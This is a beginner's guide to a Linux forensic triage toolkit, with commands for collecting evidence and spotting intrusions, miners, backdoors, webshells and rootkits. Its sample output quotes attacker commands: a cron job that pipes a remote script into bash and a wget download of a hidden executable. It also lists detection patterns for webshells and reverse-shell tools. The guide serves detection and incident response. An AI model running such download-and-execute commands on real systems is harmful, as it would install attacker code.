# Linux forensics with nix-forensics: a beginner's guide

This guide assumes you have a Linux machine that *might* be compromised and you want to
find out, without installing anything on it. Every command below is safe to run: the tools
only read from the system and write to the output file or folder you name.

## 1. Get the tools onto the machine (3 ways)

**a) Clone from GitHub** (needs git and internet on the machine):

```bash
git clone https://github.com/amitrrajeshwarkar/atomic-red-team.git
cd atomic-red-team/nix-forensics
```

**b) Copy just the toolkit folder** from your laptop to the suspect machine (no git needed):

```bash
scp -r nix-forensics user@suspect-host:/tmp/nfx
ssh user@suspect-host
cd /tmp/nfx
```

**c) USB stick**: copy the `nix-forensics` folder to the stick, plug it in, `cd` into it.

Then check everything works on that machine:

```bash
tests/smoke.sh          # prints "total: 50 ok, 0 failed" when all is well
```

Optional: put the tools on your PATH so you can type `nfx-users` from anywhere:

```bash
sudo ./install.sh        # symlinks into /usr/local/bin
```

Run the tools with `sudo`. Without root you still get results, but some files
(`/etc/shadow`, other users' home directories, the journal) are unreadable.

## 2. Your first run: one command collects everything

```bash
sudo bin/nfx-triage --case 2024-001
```

This takes about a minute and creates a folder `nfx-triage-<hostname>-<time>/` plus a
`.tar.gz` of it. Inside:

| File | What it is |
|------|------------|
| `findings.txt` | **Start here.** Every `[!]` flag from every tool, one per line |
| `sysinfo.txt`, `users.txt`, `procs.txt`, ... | The full report of each tool |
| `*.csv` | Machine-readable versions (open in a spreadsheet or `grep` them) |
| `raw/` | Copies of the original files (`/etc/passwd`, `authorized_keys`, logs, crontabs...) |
| `manifest.csv` | sha256 of every file above, so you can prove nothing changed later |
| `triage.log` | What ran, how long it took, exit codes |

Read `findings.txt` first:

```
$ cat nfx-triage-web01-20240512T101500Z/findings.txt
[users] [SUDO-NOPASSWD] /etc/sudoers.d/deploy:1:deploy ALL=(ALL) NOPASSWD: ALL
[persistence] [SUSPICIOUS] /etc/cron.d/system-update:1:* * * * * root curl -s http://45.9.1.2/x.sh | bash
[procs] [TEMP-EXE] pid 4821 (kworkerds): TEMP-EXE
[procs] [KTHREAD-NAME-WITH-EXE] pid 4821 (kworkerds): KTHREAD-NAME-WITH-EXE
[network] [ODD-REMOTE-PORT] connection to a port ... users:(("kworkerds",pid=4821)) 10.0.0.5:52310 45.9.1.2:4444
[ssh] [AUTHKEYS-RECENT] user deploy: /home/deploy/.ssh/authorized_keys modified within 7d
[shellhist] [SUSP-CMD] user deploy .bash_history:212: wget http://45.9.1.2/x.sh -O /tmp/.x && chmod +x /tmp/.x
[logs] [LOG-EMPTY] /var/log/wtmp is 0 bytes
```

Those eight lines are a whole intrusion story: a cron job downloads a script, a process
named like a kernel thread runs from a temp directory and talks to port 4444, an SSH key was
added, the shell history shows the download, and the login log was wiped.

**Important:** a flag is a *lead*, not proof. Every tool ends with the reminder
"Flags are leads, not verdicts". Open the matching `.txt` file to see the full context.

## 3. Understanding the output format

All tools print the same way:

```
nfx-users v1.0.0 | host=vm | os=linux | user=root | utc=2026-09-15T17:36:30Z   <- who/when

==================== Accounts ====================                             <- a big topic
--- Admin group members ---                                                    <- a sub-topic
USER   UID   GID   HOME    SHELL                                                <- raw data
...
[*] 16 SUID/SGID files found                                                   <- information
[-] Not running as root: some artifacts will be unreadable                     <- warning
[!] [SUDO-NOPASSWD] /etc/sudoers:58:claude ALL=(ALL) NOPASSWD: ALL             <- a finding

==================== Findings recap: 4 flagged by nfx-users ====================
[SYSTEM-SHELL] system account with an interactive shell: postgres uid=102 shell=/bin/bash
[ODD-HOME] account with home in a temp/dev path: sys home=/dev
[SUDO-NOPASSWD] /etc/sudoers:58:claude ALL=(ALL) NOPASSWD: ALL
[*] Flags are leads, not verdicts - verify each one against the raw output above.
```

Useful habits:

```bash
sudo bin/nfx-users -o users.txt        # see it on screen AND save it
sudo bin/nfx-users | grep '^\[!\]'     # only the flags
bin/nfx-users --help                   # every tool explains itself
```

Time windows are written the same way everywhere: `30m`, `12h`, `7d`, `2w`, or a date
like `2024-05-01`.

## 4. Simple scenarios

### "I think someone logged in who shouldn't have"

```bash
sudo bin/nfx-auth --since 7d
```

Shows successful SSH logins (who, from where, password or key), failed attempts and the top
attacking IPs, sudo commands, `su` use, and account changes. Flags like `BRUTE-THEN-SUCCESS`
mean an IP failed many times and then got in.

Follow up with:

```bash
sudo bin/nfx-users              # was an account added? does anyone have NOPASSWD sudo?
sudo bin/nfx-ssh                # was a key added to authorized_keys? when?
sudo bin/nfx-shellhist --user deploy --tail 100   # what did they type?
```

### "The server is slow, maybe it's mining crypto"

```bash
sudo bin/nfx-procs
```

Look for `MINER-NAME`, `TEMP-EXE` (running from /tmp or /dev/shm), `DELETED-EXE` (binary
deleted after launch, a classic hiding trick) and `KTHREAD-NAME-WITH-EXE` (a real program
pretending to be a kernel thread like `kworker`). The "Top CPU consumers" table is at the top.

Then see what it talks to and how it survives reboots:

```bash
sudo bin/nfx-network            # ODD-REMOTE-PORT, e.g. mining pools on 3333/4444/14444
sudo bin/nfx-persistence        # cron jobs, systemd services, rc files that restart it
```

### "Is there a backdoor that survives reboot?"

```bash
sudo bin/nfx-persistence --since 30d
```

Checks every place Linux can auto-start something: cron, at, systemd services and timers,
`/etc/rc.local`, `.bashrc`-style files for every user, `/etc/ld.so.preload`, udev rules,
PAM, XDG autostart and more. Anything changed in the last 30 days is marked `RECENT`;
anything that looks like `curl ... | bash`, base64, netcat, `/dev/tcp/` is `SUSPICIOUS`.

### "The website got hacked"

```bash
sudo bin/nfx-webshell                       # scans /var/www, nginx/apache roots automatically
sudo bin/nfx-webshell --path /srv/app       # or point it at your web root
```

Files get a score: `eval(`, `base64_decode`, `$_POST[...]` going into `system(`, known shell
names, scripts inside `uploads/` folders, double extensions like `photo.jpg.php`. Score 3 or
more is `WEBSHELL-LIKELY`. Then check what the web server user changed:

```bash
sudo bin/nfx-recent --since 7d --path /var/www
```

### "Which files changed around the time of the incident?"

```bash
sudo bin/nfx-recent --since 2024-05-10                 # human-readable
sudo bin/nfx-timeline --since 2024-05-10 /etc /home /tmp /opt > timeline.csv
```

`nfx-recent` also flags timestamp tampering (`TIMESTOMP`), hidden files in odd places, and
executables dropped in temp directories. `nfx-timeline` gives you a spreadsheet with
modified / accessed / changed / created times for every file, newest first.

### "Were the logs wiped?"

```bash
sudo bin/nfx-logs
```

Flags zero-byte logs (`LOG-EMPTY`), logs that stopped being written (`LOG-STALE`), gaps of
several hours in the journal (`LOG-GAP`), and logs pointing at `/dev/null`. Combine with
`nfx-shellhist`, which flags `history -c`, `unset HISTFILE`, `shred` and friends.

### "Someone gave me a list of bad IPs / hashes / file names"

Put them in a text file, one per line (the type is detected automatically):

```
45.9.1.2
bad-cdn.example.net
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
kworkerds
```

```bash
sudo bin/nfx-ioc -i iocs.txt
```

It checks live connections, `/etc/hosts`, DNS settings, shell histories, cron/systemd
configs, logs and the journal, file names, file contents, running process command lines and
file/process hashes, and prints one `[!]` line per hit with where it was found.

### "Did anything change since the machine was built?"

On the golden image (or right after install):

```bash
sudo bin/nfx-triage -d baseline --quick --no-tar
sudo bin/nfx-suid --save suid-baseline.txt
```

On the suspect machine later:

```bash
sudo bin/nfx-triage -d now --quick --no-tar
bin/nfx-diff --flags-only baseline/ now/          # only new/removed findings
sudo bin/nfx-suid --compare suid-baseline.txt     # new or changed setuid binaries
```

### "Are the system binaries themselves trojaned?"

```bash
sudo bin/nfx-packages                # compares ssh, sudo, ls, ps, netstat... with package md5s
sudo bin/nfx-packages --verify       # full package verification (slow)
sudo bin/nfx-packages --orphans      # binaries in /usr/bin etc. that no package owns
```

### "Is there a rootkit?"

```bash
sudo bin/nfx-kernel                  # modules hidden from lsmod, unsigned modules, ftrace hooks
sudo bin/nfx-procs                   # HIDDEN-PID: process answers signals but is not in /proc
sudo bin/nfx-mounts                  # PROC-BIND-MOUNT: a mount used to hide a process from ps
```

A clean result means "nothing found by these checks", not "nothing there".

## 5. Doing it across many machines

Each tool is a single file, so it is easy to run remotely:

```bash
for h in web01 web02 db01; do
  scp -rq nix-forensics "$h:/tmp/nfx"
  ssh "$h" 'sudo /tmp/nfx/bin/nfx-persistence --no-color --since 7d' > "out/$h.txt"
done
grep -h '^\[!\]' out/*.txt | sort | uniq -c | sort -rn | head    # most common flags fleet-wide
```

`--no-color` keeps the saved files free of terminal colour codes.

## 6. Preserving evidence properly

* Write output to a different disk or USB stick when you can:
  `sudo bin/nfx-triage -d /mnt/usb/case-001`.
* Keep the `.tar.gz` and note its sha256 (printed at the end of the triage run) in your
  case notes. `manifest.csv` inside lists the hash of every collected file.
* Do the triage *before* rebooting, patching or "cleaning": processes, connections and
  temporary files disappear on reboot.
* Save the tool version too: `bin/nfx-triage --version`.

## 7. Cheat sheet

| I want to... | Command |
|--------------|---------|
| Collect everything | `sudo bin/nfx-triage --case ID` |
| Faster collection | `sudo bin/nfx-triage --quick` |
| Only some tools | `sudo bin/nfx-triage --tools users,auth,ssh,persistence` |
| See logins | `sudo bin/nfx-auth --since 7d` |
| See accounts / sudo | `sudo bin/nfx-users` |
| See SSH keys | `sudo bin/nfx-ssh` |
| See what users typed | `sudo bin/nfx-shellhist --tail 100` |
| See running programs | `sudo bin/nfx-procs` |
| See network connections | `sudo bin/nfx-network` |
| See autostart / backdoors | `sudo bin/nfx-persistence` |
| See recently changed files | `sudo bin/nfx-recent --since 24h` |
| Build a file timeline | `sudo bin/nfx-timeline --since 7d /etc /home > tl.csv` |
| Check for webshells | `sudo bin/nfx-webshell` |
| Check kernel / rootkits | `sudo bin/nfx-kernel` |
| Check containers | `sudo bin/nfx-containers` |
| Check logs were not wiped | `sudo bin/nfx-logs` |
| Search for IOCs | `sudo bin/nfx-ioc -i iocs.txt` |
| Hash running programs | `sudo bin/nfx-hash --procs > procs.csv` |
| Compare two hosts / runs | `bin/nfx-diff --flags-only before/ after/` |
| Machine-readable output | add `--csv` to procs, shellhist, recent, webshell, ioc |
| Save output to a file | add `-o report.txt` to any tool |
